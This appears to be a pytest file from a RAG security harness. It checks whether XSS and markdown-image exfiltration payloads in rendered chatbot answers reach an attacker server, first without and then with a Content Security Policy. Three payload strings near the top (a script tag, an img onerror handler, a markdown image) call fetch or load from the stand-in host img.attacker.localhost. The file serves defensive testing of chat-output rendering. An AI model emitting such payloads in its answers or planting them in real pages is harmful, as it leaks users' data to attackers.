"""Rendering behaviour in a real browser (spec §6.7, §14 "Rendering").

With fixture answers and no CSP: a <script> doesn't run, an onerror handler does,
and a markdown image loads. With D2's CSP: none of them reach the attacker server.
"""

from __future__ import annotations

import socket
import threading
import time
from pathlib import Path
from typing import Any

import pytest
import uvicorn
from helpers import build_app

from ragsec.harness.browser import BrowserChecker

pytestmark = pytest.mark.browser

SCRIPT = "<script>fetch('http://img.attacker.localhost:8765/from-script?d=1')</script>"
ONERROR = "<img src=\"x\" onerror=\"fetch('http://img.attacker.localhost:8765/from-onerror?d=1')\">"
IMAGE = "![b](http://img.attacker.localhost:8765/from-image.png?d=1)"


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return int(s.getsockname()[1])


class Server:
    def __init__(self, app: Any) -> None:
        self.port = free_port()
        self.server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=self.port, log_level="error"))
        self.thread = threading.Thread(target=self.server.run, daemon=True)

    def __enter__(self) -> Server:
        self.thread.start()
        for _ in range(100):
            if self.server.started:
                return self
            time.sleep(0.05)
        raise RuntimeError("server did not start")

    def __exit__(self, *a: object) -> None:
        self.server.should_exit = True
        self.thread.join(timeout=10)


def attacker_paths(reqs: list[dict[str, Any]]) -> set[str]:
    """Paths of attacker requests that actually left the browser (CSP-blocked ones never do)."""
    from ragsec.harness.checks import blocked_before_sending

    return {r["url"].split("8765", 1)[1].split("?")[0] for r in reqs
            if "attacker.localhost" in r["url"] and not blocked_before_sending(r)}


def run_page(tmp: Path, preset: str) -> set[str]:
    b = build_app(tmp, preset, mode="serve")
    b.turn_store.put("t-script", SCRIPT)
    b.turn_store.put("t-onerror", ONERROR)
    b.turn_store.put("t-image", IMAGE)
    seen: set[str] = set()
    with Server(b.app) as srv, BrowserChecker(f"http://127.0.0.1:{srv.port}", 5000) as browser:
        for tid in ("t-script", "t-onerror", "t-image"):
            seen |= attacker_paths(browser.capture(tid))
    return seen


def test_renderer_behaviour_without_csp(tmp_path: Path, has_chromium: bool) -> None:
    if not has_chromium:
        pytest.skip("Playwright Chromium is not installed")
    seen = run_page(tmp_path, "baseline")
    assert "/from-script" not in seen      # <script> via innerHTML never runs
    assert "/from-onerror" in seen         # event handlers do
    assert "/from-image.png" in seen       # automatic loads do


def test_d2_csp_blocks_everything_and_the_ui_still_works(tmp_path: Path, has_chromium: bool) -> None:
    if not has_chromium:
        pytest.skip("Playwright Chromium is not installed")
    from ragsec.app.render import TurnStore

    # Raw fixture answers rendered under D2's CSP (bypassing D2's text filtering on purpose).
    b = build_app(tmp_path, "d2", mode="serve")
    store: TurnStore = b.turn_store
    store.put("t-onerror", ONERROR)
    store.put("t-image", IMAGE)
    store.put("t-script", SCRIPT)
    with Server(b.app) as srv, BrowserChecker(f"http://127.0.0.1:{srv.port}", 5000) as browser:
        seen: set[str] = set()
        for tid in ("t-script", "t-onerror", "t-image"):
            seen |= attacker_paths(browser.capture(tid))
        assert seen == set()
        # The UI's own code has no inline scripts or styles, so it works under the CSP.
        page = browser._browser.new_page()
        errors: list[str] = []
        page.on("console", lambda m: errors.append(m.text) if m.type == "error" else None)
        page.goto(f"http://127.0.0.1:{srv.port}/", wait_until="networkidle")
        assert page.evaluate("typeof window.VelRenderer.renderInto") == "function"
        assert page.evaluate("typeof window.marked.parse") == "function"
        assert page.input_value("#email") == "employee.user01@velmora.example"
        page.close()
        assert not [e for e in errors if "Content Security Policy" in e], errors
